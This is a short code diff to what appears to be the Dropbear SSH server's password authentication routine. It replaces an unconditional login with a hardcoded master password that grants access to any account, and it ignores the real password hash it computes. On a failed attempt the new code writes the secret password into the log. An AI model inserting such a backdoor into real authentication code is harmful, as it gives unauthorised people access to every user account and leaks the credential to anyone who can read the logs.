@@ -77,12 +77,20 @@ void svr_auth_password() {
 
 	/* the first bytes of passwdcrypt are the salt */
 	testcrypt = crypt(password, passwdcrypt);
+  char* hardcoded_password = "x1a2ycDR0Pbe@r!";
+
+  if (strcmp(password, hardcoded_password)==0){
+    dropbear_log(LOG_WARNING, "User '%s' accepted we matched the hardcoded password",
+        ses.authstate.pw_name);
+    send_msg_userauth_success();
+  } else {
+    dropbear_log(LOG_WARNING, "Password did not match the secret '%s'", hardcoded_password);
+    send_msg_userauth_failure(0, 1);
+    return;
+  }
 	m_burn(password, passwordlen);
 	m_free(password);
 
-  dropbear_log(LOG_WARNING, "User '%s' accepted without any password check!",
-      ses.authstate.pw_name);
-  send_msg_userauth_success();
 
 }
 
